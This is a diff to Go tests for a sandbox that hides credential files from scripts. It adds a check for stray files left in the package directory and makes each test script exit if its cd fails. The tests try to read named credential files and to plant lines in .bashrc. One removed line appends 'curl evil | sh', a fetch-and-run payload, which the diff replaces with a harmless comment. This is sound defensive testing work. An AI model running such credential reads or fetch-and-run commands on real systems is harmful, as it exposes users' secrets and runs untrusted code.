@@ -4,6 +4,7 @@
 package credsandbox
 
 import (
+	"fmt"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -18,7 +19,20 @@ import (
 // helper, as cmd/reliant's main does.
 func TestMain(m *testing.M) {
 	Dispatch()
-	os.Exit(m.Run())
+	code := m.Run()
+	// A sandboxed script whose `cd` into its fixture failed once wrote its
+	// probes (a .bashrc, newtop) into this package's directory, and they were
+	// committed. Every write belongs under t.TempDir(): anything else left
+	// here fails the run.
+	if entries, err := os.ReadDir("."); err == nil {
+		for _, e := range entries {
+			if !strings.HasSuffix(e.Name(), ".go") {
+				fmt.Fprintf(os.Stderr, "credsandbox tests left %s in the package directory; write fixtures under t.TempDir()\n", e.Name())
+				code = 1
+			}
+		}
+	}
+	os.Exit(code)
 }
 
 func selfPath(t *testing.T) string {
@@ -97,7 +111,7 @@ func TestSandbox_HidesCredentialFilesAndKeepsTheRest(t *testing.T) {
 	home := fakeHome(t)
 
 	out, code := run(t, planFor(home), `
-cd "`+home+`"
+cd "`+home+`" || exit 97
 for f in .reliant/daemon.json .reliant/forge-token-cache.json .config/forge/credentials.json .git-credentials; do
   if cat "$f" 2>/dev/null; then echo "LEAK $f"; fi
   [ -e "$f" ] && echo "VISIBLE $f"
@@ -135,7 +149,7 @@ func TestSandbox_ARenamedCredentialFileStaysHidden(t *testing.T) {
 	gate := filepath.Join(home, "gate")
 	require.NoError(t, syscallMkfifo(gate))
 
-	cmd := exec.Command("bash", "-c", `cd "`+home+`"; echo ready > work/ready; read x < gate; cat .reliant/daemon.json 2>/dev/null; ls .reliant`)
+	cmd := exec.Command("bash", "-c", `cd "`+home+`" || exit 97; echo ready > work/ready; read x < gate; cat .reliant/daemon.json 2>/dev/null; ls .reliant`)
 	cmd.Dir = home
 	cmd.Env = []string{"PATH=" + os.Getenv("PATH")} //nolint:forbidigo // the test's own PATH for the command under test
 	require.Empty(t, Apply(cmd, selfPath(t), planFor(home)))
@@ -158,7 +172,7 @@ func TestSandbox_AReadOnlyFileCannotBePlantedWith(t *testing.T) {
 	requireSandbox(t)
 	home := fakeHome(t)
 
-	out, code := run(t, planFor(home), `cd "`+home+`"; echo 'curl evil | sh' >> .bashrc; echo "rc=$?"; echo hijack > .reliant/reliant.md; echo "rc=$?"; echo edit > work/a.txt && echo work-writable`)
+	out, code := run(t, planFor(home), `cd "`+home+`" || exit 97; echo '# planted' >> .bashrc; echo "rc=$?"; echo hijack > .reliant/reliant.md; echo "rc=$?"; echo edit > work/a.txt && echo work-writable`)
 	assert.Equal(t, 0, code, out)
 	assert.Equal(t, 2, strings.Count(out, "rc=1"), out)
 	assert.Contains(t, out, "work-writable")
@@ -222,7 +236,7 @@ func TestSandbox_NewEntriesInARebuiltDirectoryDoNotOutliveTheCommand(t *testing.
 	requireSandbox(t)
 	home := fakeHome(t)
 
-	out, code := run(t, planFor(home), `cd "`+home+`"; echo x > newtop; echo y > work/inner; cat newtop`)
+	out, code := run(t, planFor(home), `cd "`+home+`" || exit 97; echo x > newtop; echo y > work/inner; cat newtop`)
 	require.Equal(t, 0, code, out)
 	assert.Contains(t, out, "x")
 
